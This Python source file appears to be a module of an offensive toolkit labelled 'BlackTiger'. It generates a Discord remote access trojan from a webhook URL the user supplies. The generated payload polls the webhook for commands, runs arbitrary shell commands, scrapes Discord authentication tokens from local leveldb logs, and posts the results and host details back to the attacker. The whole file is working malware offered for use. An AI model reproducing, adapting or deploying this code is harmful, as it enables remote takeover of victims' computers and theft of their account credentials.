#!/usr/bin/env python3
# Discord RAT Builder Module

import os

def run():
    print("\n" + "="*60)
    print("DISCORD RAT BUILDER")
    print("="*60)
    
    webhook = input("Webhook URL: ").strip()
    filename = input("Filename [discord_rat]: ").strip() or "discord_rat"
    
    code = f'''#!/usr/bin/env python3
import requests, subprocess, os, time, sys, platform, glob, re
WEBHOOK = "{webhook}"
IS_WIN = platform.system() == "Windows"
def send(data):
    try: requests.post(WEBHOOK, json={{'content': data}})
    except: pass
def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)
def steal_tokens():
    tokens = []
    paths = []
    if IS_WIN:
        paths = glob.glob(os.path.expandvars("%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb\\\\*.log"))
    else:
        paths = glob.glob(os.path.expanduser("~/.config/discord/Local Storage/leveldb/*.log"))
    for p in paths:
        if os.path.exists(p):
            with open(p, 'r', errors='ignore') as f:
                for line in f:
                    matches = re.findall(r'[\\w-]{{24,}}\\.[\\w-]{{6,}}\\.[\\w-]{{27,}}', line)
                    tokens.extend(matches)
    return tokens
def main():
    while True:
        try:
            r = requests.get(WEBHOOK, timeout=5)
            if r.status_code == 200 and r.text:
                cmd = r.text.strip()
                if cmd.startswith('shell '):
                    result = execute_cmd(cmd[6:])
                    send(result)
                elif cmd == 'tokens':
                    tokens = steal_tokens()
                    send(f"Tokens: {{tokens}}")
                elif cmd == 'sysinfo':
                    info = f"OS: {{platform.system()}}\\nHost: {{platform.node()}}\\nUser: {{os.getlogin()}}"
                    send(info)
        except: pass
        time.sleep(5)
if __name__ == "__main__":
    main()
'''
    
    out_dir = os.path.expanduser("~/Downloads/BlackTiger_Output")
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, filename + ".py")
    with open(path, 'w') as f:
        f.write(code)
    
    print(f"RAT saved: {path}")
    print("Commands: shell [cmd], tokens, sysinfo")

if __name__ == "__main__":
    run()